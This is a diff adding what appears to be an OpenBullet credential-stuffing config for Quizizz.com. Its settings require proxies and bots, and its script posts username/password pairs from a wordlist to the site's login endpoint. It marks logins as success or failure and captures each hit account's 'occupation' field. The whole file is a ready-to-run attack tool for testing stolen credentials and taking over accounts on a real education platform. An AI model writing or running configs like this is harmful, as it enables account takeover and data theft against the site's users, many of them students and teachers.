@@ -1,0 +1,42 @@
+[SETTINGS]
+{
+  "Name": "Quizizz.com",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-07T10:05:31.1415403+02:00",
+  "AdditionalInfo": "",
+  "Author": "Acemy#7578",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://quizizz.com/auth/local" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "Host: quizizz.com" 
+  HEADER "Origin: https://quizizz.com" 
+  HEADER "Referer: https://quizizz.com/join" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"success\":true" 
+  KEYCHAIN Failure OR 
+    KEY "{\"success\":false" 
+PARSE "<SOURCE>" LR "occupation\":\"" "\",\"" -> CAP "Occupation" 
